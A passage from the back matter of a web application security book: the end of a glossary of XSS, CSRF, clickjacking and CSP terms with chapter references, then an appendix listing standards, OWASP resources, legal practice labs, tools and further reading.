without sanitization; the payload may never reach the server. (Ch. 10)

**Encoding (output encoding)** — Converting data so its special characters render as text in a
given context (e.g., `<` → `&lt;`). The primary defense against injection/XSS; **must match the
context**. (Ch. 2, 18)

**Entity (character reference)** — A way to represent characters as text (`&lt;`, `&#60;`,
`&#x3C;`). Decoded in some contexts but not in `<script>`/`<style>`. (Ch. 2, 3)

**Escape hatch** — A framework feature that bypasses auto-escaping
(`dangerouslySetInnerHTML`, `v-html`, `|safe`, `Html.Raw`); a recurring source of XSS. (Ch. 18)

**Foreign content** — SVG/MathML islands inside HTML parsed with XML-like rules; a hotspot for
mutation XSS and sanitizer bypasses. (Ch. 3, 14)

**Frame-busting** — JavaScript that tries to prevent a page being framed; bypassable, so not a
substitute for `frame-ancestors`/`X-Frame-Options`. (Ch. 12)

**`frame-ancestors`** — The CSP directive controlling which origins may frame a page; the modern
anti-clickjacking control. (Ch. 12, 19)

**HTML injection** — Untrusted data interpreted as markup due to missing context-appropriate
encoding; the root condition underlying XSS. (Ch. 7)

**`HttpOnly`** — A cookie flag hiding the cookie from JavaScript, limiting (not preventing) XSS
looting of session cookies. (Ch. 4, 18)

**`innerHTML`** — A DOM property/sink that parses a string as HTML; runs event-handler vectors
(not bare `<script>`). Contrast `textContent`. (Ch. 4, 10)

**Insertion mode** — A state of the HTML tree builder (e.g., "in body," "in table") governing
where nodes go; source of relocation/foster-parenting behavior. (Ch. 3)

**Login CSRF** — Forging a login request to authenticate the victim into the *attacker's*
account. (Ch. 11)

**Mutation XSS (mXSS)** — XSS arising when a sanitizer and the browser parse the "clean" output
differently on re-parse. (Ch. 3, 14)

**Nonce (CSP)** — An unpredictable per-response token that authorizes specific inline scripts;
core to strict CSPs. Must be unique/unpredictable per response. (Ch. 19)

**Open redirect** — An app that redirects to an attacker-controlled URL from user input; enables
phishing and can escalate to XSS via `javascript:`. (Ch. 10)

**OAST (Out-of-band Application Security Testing)** — Using an attacker-controlled server
(collaborator) to detect interactions like blind XSS callbacks. (Ch. 9, 16)

**Polyglot (file)** — A file valid as multiple formats at once, used to bypass upload content
checks while still being interpreted as HTML/script. (Ch. 14)

**Quirks mode** — A legacy rendering mode triggered by a missing/incorrect doctype; affects layout
and some security-relevant behaviors. (Ch. 2)

**RAWTEXT / RCDATA** — Special tokenizer states. RAWTEXT (`<style>`, historically others): `<` is
text, entities not decoded. RCDATA (`<textarea>`, `<title>`): `<` is text, entities decoded.
(Ch. 2, 3)

**Reflected XSS** — XSS where the payload is in the request and echoed into the immediate
response; requires luring the victim to send the request. (Ch. 8)

**`SameSite` (cookie)** — A cookie attribute (`Strict`/`Lax`/`None`) controlling cross-site
sending; the main browser-level CSRF mitigation. (Ch. 11)

**Sanitizer** — A library that parses HTML and removes disallowed tags/attributes per an
allow-list; required for safely rendering user HTML. Prefer vetted libraries (e.g., DOMPurify).
(Ch. 18)

**Same-Origin Policy (SOP)** — The browser rule isolating origins (scheme+host+port); restricts
cross-origin *reading*, not *sending*/*embedding*. (Ch. 4)

**Second-order (stored) XSS** — Input that's safe where entered but rendered unsafely elsewhere,
often a higher-privilege view. (Ch. 9)

**Service Worker** — A scriptable, persistent network proxy for an origin; an attacker with
same-origin script (e.g., via XSS) can register one for durable control. (Ch. 13)

**Sink** — A DOM/code location where writing data can cause execution or a dangerous state
(`innerHTML`, `eval`, URL setters). (Ch. 4, 10)

**Source** — A location where client-side code reads attacker-influenceable input
(`location.*`, `referrer`, `window.name`, `postMessage`, storage). (Ch. 4, 10)

**Stored (persistent) XSS** — XSS where the payload is saved server-side and served to other
users automatically; often critical. (Ch. 9)

**`strict-dynamic`** — A CSP `script-src` keyword letting nonce/hash-trusted scripts load further
scripts, while ignoring host allow-lists; avoids allow-list bypasses. (Ch. 19)

**Tabnabbing (reverse)** — A page opened via `target=_blank` redirecting the original tab via
`window.opener`; mitigated by `rel="noopener"`. (Ch. 13)

**`textContent`** — A safe DOM property that sets text without parsing markup; the client-side
equivalent of correct encoding. (Ch. 4, 18)

**Tokenizer** — The HTML parser's state machine that turns characters into tokens; its current
state determines the break-out character for a payload. (Ch. 3)

**Trusted Types** — A browser mechanism (via CSP `require-trusted-types-for 'script'`) forcing DOM
sinks to accept only vetted typed objects; the strongest DOM-XSS structural defense. (Ch. 10, 19)

**`'unsafe-inline'` / `'unsafe-eval'`** — CSP keywords that, respectively, allow inline scripts/
handlers and `eval`; their presence largely negates CSP's XSS protection. (Ch. 19)

**Void element** — An element with no content/end tag (`<img>`, `<input>`, `<br>`); the
self-closing slash is ignored in HTML. (Ch. 2)

**XSS (Cross-Site Scripting)** — Injection achieving JavaScript execution in the victim's origin;
classes: reflected, stored, DOM-based. (Ch. 8–10)

**XXE (XML External Entity)** — A server-side XML-parsing flaw (reachable via SVG/XML uploads)
allowing file read/SSRF when external entities are processed. (Ch. 14)

---

<a id="C-references"></a>

# Appendix C — References and Further Reading

> A curated map of authoritative resources to go deeper. Prefer primary sources (standards and
> maintainers) and well-established security organizations. URLs change over time; if a link
> moves, search the resource title from the named organization.
>
> *Content here is summarized/paraphrased from the named public resources for compliance with
> licensing restrictions; consult the originals for full detail.*

---

## C.1 Standards and platform documentation (primary sources)

- **WHATWG HTML Living Standard** — the authoritative HTML specification, including the parsing
  algorithm (tokenizer states, tree construction, foreign content). The ground truth behind
  [Chapter 3](#03-browser-parsing). <https://html.spec.whatwg.org/>
- **MDN Web Docs** (Mozilla) — practical, reliable documentation for HTML elements/attributes,
  the DOM, `postMessage`, CORS, cookies, CSP, Trusted Types, and security headers.
  <https://developer.mozilla.org/>
- **W3C / WHATWG DOM Standard** — the DOM specification. <https://dom.spec.whatwg.org/>
- **Fetch Standard** (WHATWG) — request/response model, CORS semantics.
  <https://fetch.spec.whatwg.org/>
- **CSP Level 3** (W3C) — the Content Security Policy specification.
  <https://www.w3.org/TR/CSP3/>
- **Trusted Types** (W3C draft/community) — the DOM-sink hardening mechanism.

## C.2 OWASP resources

- **OWASP Cheat Sheet Series** — concise, actionable guidance. Especially:
  - *Cross Site Scripting Prevention Cheat Sheet* (context-aware output encoding).
  - *DOM based XSS Prevention Cheat Sheet*.
  - *Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet*.
  - *Clickjacking Defense Cheat Sheet*.
  - *Content Security Policy Cheat Sheet*.
  - *HTML5 Security Cheat Sheet* and *File Upload Cheat Sheet*.
  <https://cheatsheetseries.owasp.org/>
- **OWASP Web Security Testing Guide (WSTG)** — methodology that complements
  [Chapter 15](#15-methodology). <https://owasp.org/www-project-web-security-testing-guide/>
- **OWASP Top 10** — risk categories (Injection, etc.) for framing severity and reporting.
  <https://owasp.org/www-project-top-ten/>
- **OWASP Juice Shop** and **OWASP WebGoat** — legal practice apps (Chapter 17).
  <https://owasp.org/www-project-juice-shop/>

## C.3 Hands-on learning (legal labs)

- **PortSwigger Web Security Academy** — free, high-quality labs and clear write-ups for reflected/
  stored/DOM XSS, CSRF, clickjacking, CORS, and more; the best companion to this book.
  <https://portswigger.net/web-security>
- **DVWA (Damn Vulnerable Web Application)** — adjustable-difficulty teaching app; great for
  studying vulnerable-vs-fixed diffs. <https://github.com/digininja/DVWA>
- **TryHackMe** <https://tryhackme.com/> and **Hack The Box** <https://www.hackthebox.com/> —
  managed legal ranges.

## C.4 Tooling

- **Burp Suite** (PortSwigger) — intercepting proxy/scanner; see Collaborator (OAST) and
  DOM Invader. <https://portswigger.net/burp>
- **OWASP ZAP** — free, open-source proxy/scanner. <https://www.zaproxy.org/>
- **DOMPurify** — widely used client-side HTML sanitizer; pairs with Trusted Types
  ([Chapter 18](#18-defense-remediation)). <https://github.com/cure53/DOMPurify>
- Browser **DevTools** (Chromium/Firefox) — the primary instrument
  ([Chapter 16](#16-tooling)).

## C.5 Vulnerability taxonomy and scoring

- **CWE (Common Weakness Enumeration)** — reference IDs for findings, e.g., CWE-79 (XSS),
  CWE-352 (CSRF), CWE-1021 (clickjacking/UI redress), CWE-434 (unrestricted upload), CWE-611
  (XXE). <https://cwe.mitre.org/>
- **CVSS (Common Vulnerability Scoring System)** — consistent severity scoring for reports.
  <https://www.first.org/cvss/>

## C.6 Topic deep-dives (where to read more)

- **HTML parsing & mutation XSS** — the WHATWG parsing section (C.1); cure53/DOMPurify research and
  write-ups on mXSS bypasses; browser-vendor security blogs.
- **CSP that actually works** — Google's CSP guidance favoring **nonces + `'strict-dynamic'`** over
  host allow-lists, and research on host-allow-list bypasses (JSONP/open-redirect/gadgets). See
  the OWASP CSP Cheat Sheet (C.2) and W3C CSP3 (C.1). <https://csp.withgoogle.com/>
- **CSRF & `SameSite`** — MDN on `SameSite` cookies; OWASP CSRF Cheat Sheet (C.2).
- **Clickjacking** — OWASP Clickjacking Defense Cheat Sheet; MDN on `X-Frame-Options` and CSP
  `frame-ancestors`.
- **CORS misconfigurations** — PortSwigger Academy CORS labs; MDN CORS docs.
- **File uploads / SVG / XXE** — OWASP File Upload and XXE Prevention Cheat Sheets.

## C.7 Certifications and structured study (optional)

For readers pursuing professional credentials that cover this material:

- **PortSwigger Burp Suite Certified Practitioner (BSCP)** — practical web testing.
- **OffSec / eLearnSecurity web certifications** (e.g., OSWE, eWPT) — deeper offensive web focus.
- **CompTIA / (ISC)² / general pentest certs** — broader context.

Pick based on your goals; the lab-driven practice in [Chapter 17](#17-labs) underlies
all of them.

## C.8 A note on staying current

Web security moves quickly: browsers change defaults (e.g., `SameSite=Lax`, implied
`rel=noopener` for `target=_blank`), new parser quirks and sanitizer bypasses are published, and
mitigations like Trusted Types mature. Treat this book as a durable *mental model* — contexts,
sources/sinks, parser behavior, and the layered-defense doctrine — and refresh specifics against
the primary sources above. When you encounter a new framework or API, ask the same questions this
book trains: *Where does untrusted data enter? What context does it land in? What encoding applies?
What can the browser be tricked into parsing?*

---

## How the book maps to these references

| Book topic | Primary references |
|---|---|
| HTML parsing / mXSS (Ch. 3) | WHATWG HTML Standard; cure53 mXSS research |
| DOM, SOP, sources/sinks (Ch. 4, 10) | MDN; OWASP DOM XSS Prevention Cheat Sheet |
| XSS (Ch. 7–10) | OWASP XSS Cheat Sheets; PortSwigger Academy |
| CSRF (Ch. 11) | OWASP CSRF Cheat Sheet; MDN `SameSite` |
| Clickjacking (Ch. 12) | OWASP Clickjacking Cheat Sheet; MDN `frame-ancestors` |
| HTML5 / CORS / storage (Ch. 13) | OWASP HTML5 Cheat Sheet; MDN CORS |
| Uploads / SVG / XXE (Ch. 14) | OWASP File Upload & XXE Cheat Sheets |
| Methodology / tooling (Ch. 15–16) | OWASP WSTG; Burp & ZAP docs |
| Defense / CSP / Trusted Types (Ch. 18–19) | OWASP Cheat Sheets; W3C CSP3; Google CSP guidance |
